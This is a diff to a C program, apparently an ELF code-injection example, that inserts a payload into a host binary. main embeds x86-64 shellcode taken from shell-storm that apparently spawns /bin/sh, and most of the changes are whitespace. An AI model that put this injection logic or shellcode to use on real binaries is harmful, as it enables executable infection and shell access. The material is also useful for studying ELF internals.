@@ -120,7 +120,6 @@ elf_inject_code(struct elfobj *host, struct elfobj *target, uint64_t *payload_of
 		elf_error_set(error, "calloc: %s", strerror(errno));
 		return false;
 	}
-
 	host->data_offset = elf_data_offset(host);
 	host->text_offset = elf_text_offset(host);
 
@@ -192,11 +191,11 @@ elf_inject_code(struct elfobj *host, struct elfobj *target, uint64_t *payload_of
 					Elf64_Shdr *shdr = &host->shdr64[s_iter.index-1];
 					shdr->sh_offset += payload_size;
 				}
-			}
-			
+			}		
 			memcpy(dest_mem, host->mem, ehdr_size);
 			memcpy(dest_mem + ehdr_size, target->mem, target->size);
 			memcpy(dest_mem + ehdr_size + payload_size, host->mem + ehdr_size, host->size - ehdr_size);
+			
 			*payload_offset = ehdr_size;
 			host->mem = dest_mem;
 			host->size += payload_size;
@@ -272,7 +271,6 @@ elf_inject_code(struct elfobj *host, struct elfobj *target, uint64_t *payload_of
 					}
 				}
 			}
-			
 			memcpy(dest_mem, host->mem, code_size);
 			memcpy(dest_mem + code_size, target->mem, target->size > payload_size ? 
 				       payload_size : target->size);
@@ -289,7 +287,6 @@ elf_inject_code(struct elfobj *host, struct elfobj *target, uint64_t *payload_of
 				ehdr->e_shoff += payload_size;
 
 			}
-
 			injection_end = true;	
 			break;
 		}
@@ -459,19 +456,17 @@ int main (int argc, char **argv)
 	bool res;
 
 	// http://shell-storm.org/shellcode/files/shellcode-806.php
-	uint8_t stub[27] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48" \
+	uint8_t stub[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48" \
 		         "\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 	
 	if (argc != 3) {
 		printf("Usage: %s <host> <output binary>\n", argv[0]);
 		exit(EXIT_SUCCESS);
 	}
-
 	if (elf_open_object(argv[1], &obj1, ELF_LOAD_F_STRICT, &error) == false) {
 		fprintf(stderr, "%s\n", elf_error_msg(&error));
 		return -1;
 	}
-
 	/* 
 	 * In case the binary payload is residing in disk, we can use these functions to load
 	 * it, as if it was an ELF file or some binary blob.
@@ -517,6 +512,5 @@ int main (int argc, char **argv)
 		fprintf(stderr, "%s\n", elf_error_msg(&error));
 		return -1;
 	}
-	
 	return 0;
 }
